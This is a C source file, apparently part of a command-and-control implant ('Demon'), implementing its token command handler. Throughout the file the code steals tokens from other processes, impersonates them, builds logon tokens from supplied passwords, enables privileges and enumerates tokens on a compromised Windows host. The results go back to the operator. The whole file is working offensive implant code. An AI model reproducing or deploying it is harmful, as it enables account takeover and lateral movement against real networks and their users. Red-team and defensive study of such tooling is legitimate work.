#include <Demon.h>

#include <common/Macros.h>

#include <core/Command.h>
#include <core/Token.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/SleepObf.h>
#include <core/Download.h>
#include <core/Dotnet.h>
#include <core/Kerberos.h>
#include <core/Runtime.h>
#include <core/CoffeeLdr.h>
#include <core/MemoryHide.h>
#include <inject/Inject.h>
#include <commands/Command_Token.h>

VOID CommandToken( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_TOKEN );
    DWORD    Command = ParserGetInt32( Parser );

    PRINTF( "Command => %d\n", Command )

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case DEMON_COMMAND_TOKEN_IMPERSONATE: PUTS( "Token::Impersonate" )
        {
            DWORD            dwTokenID = ParserGetInt32( Parser );
            PTOKEN_LIST_DATA TokenData = NULL;

            TokenData = TokenGet( dwTokenID );

            if ( TokenData )
            {
                PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
                PackageAddString( Package, (PCHAR) TokenData->DomainUser );
            }
            else
            {
                PUTS( "Token not found in vault." )
                PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
                PackageAddInt32( Package, FALSE );
                PackageAddInt32( Package, 0 );
            }

            break;
        }

        case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )
        {
            DWORD  TargetPid    = { 0 };
            HANDLE TargetHandle = { 0 };
            HANDLE StolenToken  = { 0 };
            BUFFER UserDomain   = { 0 };
            DWORD  NewTokenID   = { 0 };

            // TODO: send True or False

            /* parse arguments */
            TargetPid    = ParserGetInt32( Parser );
            TargetHandle = C_PTR( ParserGetInt32( Parser ) );

            /* steal token */
            if ( ! ( StolenToken = TokenSteal( TargetPid, TargetHandle ) ) ) {
                PUTS( "[!] Couldn't get remote process token" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            if ( ! TokenQueryOwner( StolenToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
                PUTS( "Failed to query user/domain from stolen token" )
                SysNtClose( StolenToken );
                PackageAddInt32( Package, FALSE );
                break;
            }

            /* TODO: pass the BUFFER struct to it instead of the PCHAR pointer */
            NewTokenID = TokenAdd( StolenToken, UserDomain.Buffer, TOKEN_TYPE_STOLEN, TargetPid, NULL, NULL, NULL );

            /* when a new token is stolen, we impersonate it automatically */
            if ( ! ImpersonateTokenFromVault( NewTokenID ) )
            {
                PUTS( "Failed to impersonate the token" )
                if ( UserDomain.Buffer ) {
                    Instance->Win32.LocalFree( UserDomain.Buffer );
                    UserDomain.Buffer = NULL;
                }
                PackageAddInt32( Package, FALSE );
                break;
            }

            PRINTF( "[^] New Token added to the Vault: %d User:[%ls]\n", NewTokenID, UserDomain.Buffer );

            PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
            PackageAddInt32( Package, NewTokenID );
            PackageAddInt32( Package, TargetPid );

            break;
        }

        case DEMON_COMMAND_TOKEN_LIST: PUTS( "Token::List" )
        {
            PTOKEN_LIST_DATA TokenList  = Instance->Tokens.Vault;
            DWORD            TokenIndex = 0;

            do {
                if ( TokenList != NULL )
                {
                    PRINTF( "[TOKEN_LIST] Index:[%d] Handle:[0x%x] User:[%s] Pid:[%d]\n", TokenIndex, TokenList->Handle, TokenList->DomainUser, TokenList->dwProcessID );

                    PackageAddInt32( Package, TokenIndex );
                    PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList->Handle );
                    PackageAddWString( Package, TokenList->DomainUser );
                    PackageAddInt32( Package, TokenList->dwProcessID );
                    PackageAddInt32( Package, TokenList->Type );
                    PackageAddInt32( Package, Instance->Tokens.Impersonate && Instance->Tokens.Token->Handle == TokenList->Handle );

                    TokenList = TokenList->NextToken;
                }
                else
                    break;

                TokenIndex++;
            } while ( TRUE );
            break;
        }

        case DEMON_COMMAND_TOKEN_PRIVSGET_OR_LIST: PUTS( "Token::PrivsGetOrList" )
        {
            PTOKEN_PRIVILEGES TokenPrivs     = NULL;
            DWORD             TPSize         = 0;
            DWORD             Length         = 0;
            HANDLE            TokenHandle    = NULL;
            PCHAR             PrivName       = NULL;
            UINT32            PrivNameLength = 0;
            BOOL              ListPrivs      = ParserGetInt32( Parser );

            PackageAddInt32( Package, ListPrivs );

            if ( ListPrivs )
            {
                PUTS( "Privs::List" )
                TokenHandle = TokenCurrentHandle();

                Instance->Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, 0, &TPSize );
                TokenPrivs = Instance->Win32.LocalAlloc( LPTR, ( TPSize + 1 ) * sizeof( TOKEN_PRIVILEGES ) );

                CHAR Name[ MAX_PATH ] = { 0 };

                if ( TokenPrivs )
                {
                    if ( Instance->Win32.GetTokenInformation( TokenHandle, TokenPrivileges, TokenPrivs, TPSize, &TPSize ) )
                    {
                        for ( INT i = 0; i < TokenPrivs->PrivilegeCount; i++ )
                        {
                            Length = MAX_PATH;
                            Instance->Win32.LookupPrivilegeNameA( NULL, &TokenPrivs->Privileges[ i ].Luid, Name, &Length );
                            PackageAddString( Package, Name );
                            PackageAddInt32( Package, TokenPrivs->Privileges[ i ].Attributes );
                        }
                    }
                }
            }
            else
            {
                PUTS( "Privs::Get" )
                PrivName = ParserGetString( Parser, &PrivNameLength );

                PackageAddInt32( Package, TokenSetPrivilege( PrivName, TRUE ) );
                PackageAddString( Package, PrivName );
            }

            if ( TokenPrivs )
            {
                MemSet( TokenPrivs, 0, sizeof( TOKEN_PRIVILEGES ) );
                Instance->Win32.LocalFree( TokenPrivs );
                TokenPrivs = NULL;
            }

            if ( TokenHandle )
            {
                SysNtClose( TokenHandle );
                TokenHandle = NULL;
            }

            break;
        }

        case DEMON_COMMAND_TOKEN_MAKE: PUTS( "Token::Make" )
        {
            UINT32 dwUserSize     = 0;
            UINT32 dwPasswordSize = 0;
            UINT32 dwDomainSize   = 0;
            PWCHAR lpDomain       = ParserGetWString( Parser, &dwDomainSize );
            PWCHAR lpUser         = ParserGetWString( Parser, &dwUserSize );
            PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
            DWORD  LogonType      = ParserGetInt32( Parser );
            WCHAR  Deli[ 2 ]      = { L'\\', 0 };
            HANDLE hToken         = NULL;
            PWCHAR UserDomain     = NULL;
            LPWSTR BufferUser     = NULL;
            LPWSTR BufferPassword = NULL;
            LPWSTR BufferDomain   = NULL;
            DWORD  UserDomainSize = dwUserSize + dwDomainSize + 1;
            DWORD  NewTokenID     = 0;

            if ( dwUserSize > 0 && dwPasswordSize > 0 && dwDomainSize > 0 )
            {
                PRINTF( "Create new token: Domain:[%ls] User:[%ls] Password:[%ls] LogonType:[%d]\n", lpDomain, lpUser, lpPassword, LogonType )

                hToken = TokenMake( lpUser, lpPassword, lpDomain, LogonType );
                if ( hToken != NULL )
                {
                    UserDomain = Instance->Win32.LocalAlloc( LPTR, UserDomainSize );

                    MemSet( UserDomain, 0, UserDomainSize );

                    StringConcatW( UserDomain, lpDomain );
                    StringConcatW( UserDomain, Deli );
                    StringConcatW( UserDomain, lpUser );

                    BufferUser     = Instance->Win32.LocalAlloc( LPTR, dwUserSize );
                    BufferPassword = Instance->Win32.LocalAlloc( LPTR, dwPasswordSize );
                    BufferDomain   = Instance->Win32.LocalAlloc( LPTR, dwDomainSize );

                    MemCopy( BufferUser, lpUser, dwUserSize );
                    MemCopy( BufferPassword, lpPassword, dwPasswordSize );
                    MemCopy( BufferDomain, lpDomain, dwDomainSize );

                    NewTokenID = TokenAdd(
                        hToken,
                        UserDomain,
                        TOKEN_TYPE_MAKE_NETWORK,
                        ( DWORD ) ( ULONG_PTR ) NtCurrentTeb()->ClientId.UniqueProcess,
                        BufferUser,
                        BufferDomain,
                        BufferPassword
                    );

                    // when a new token is created, we impersonate it automatically
                    ImpersonateTokenFromVault( NewTokenID );

                    PRINTF( "UserDomain => %ls\n", UserDomain )

                    PackageAddWString( Package, UserDomain );
                }
            }

            break;
        }

        case DEMON_COMMAND_TOKEN_GET_UID: PUTS( "Token::GetUID" )
        {
            BUFFER User  = { 0 };
            HANDLE Token = { 0 };
            BOOL   Admin = FALSE;

            /* current handle */
            if ( ( Token = TokenCurrentHandle() ) ) {
                /* query if token is elevated and add it to the package */
                PackageAddInt32( Package, TokenElevated( Token ) );

                /* query the user of from the current thread/process token */
                if ( TokenQueryOwner( Token, &User, TOKEN_OWNER_FLAG_DEFAULT ) ) {
                    PRINTF( "User => %ls [%ld]\n", User.Buffer, User.Length );
                    PackageAddBytes( Package, User.Buffer, User.Length );
                } else {
                    PackageAddBytes( Package, NULL, 0 );
                    /* TODO: send back error that we couldn't query the user of the token */
                }
            } else {
                /* something went wrong. let's report that */
                PACKAGE_ERROR_WIN32
            }

            /* close handle */
            if ( Token ) {
                SysNtClose( Token );
                Token = NULL;
            }

            /* free queried owner memory */
            if ( User.Buffer ) {
                MemZero( User.Buffer, User.Length );
                MmHeapFree( User.Buffer );
                User.Buffer = NULL;
            }

            break;
        }

        case DEMON_COMMAND_TOKEN_REVERT: PUTS( "Token::Revert" )
        {
            BOOL Success = TokenRevSelf();

            PackageAddInt32( Package, Success );

            if ( ! Success )
                PACKAGE_ERROR_WIN32;

            Instance->Tokens.Token       = NULL;
            Instance->Tokens.Impersonate = FALSE;

            break;
        }

        case DEMON_COMMAND_TOKEN_REMOVE: PUTS( "Token::Remove" )
        {
            DWORD TokenID = ParserGetInt32( Parser );

            PackageAddInt32( Package, TokenRemove( TokenID ) );
            PackageAddInt32( Package, TokenID );

            break;
        }

        case DEMON_COMMAND_TOKEN_CLEAR: PUTS( "Token::Clear" )
        {

            TokenClear();

            break;
        }

        case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::Find" )
        {
            PUSER_TOKEN_DATA TokenList    = NULL;
            DWORD            NumTokens    = 0;
            BOOL             Success      = FALSE;
            DWORD            NumDelTokens = 0;
            DWORD            NumImpTokens = 0;
            DWORD            i            = 0 ;

            Success = ListTokens( &TokenList, &NumTokens );

            PackageAddInt32( Package, Success );

            if ( Success )
            {
                PackageAddInt32( Package, NumTokens );

                for (i = 0; i < NumTokens; ++i)
                {
                    PackageAddWString( Package, TokenList[ i ].username );
                    PackageAddInt32( Package, TokenList[ i ].dwProcessID );
                    PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
                    PackageAddInt32( Package, TokenList[ i ].integrity_level );
                    PackageAddInt32( Package, TokenList[ i ].impersonation_level );
                    PackageAddInt32( Package, TokenList[ i ].TokenType );
                }
            }

            if ( TokenList )
            {
                DATA_FREE( TokenList, NumTokens * sizeof( USER_TOKEN_DATA ) );
            }

            break;
        }
    }

    PackageTransmit( Package );
}
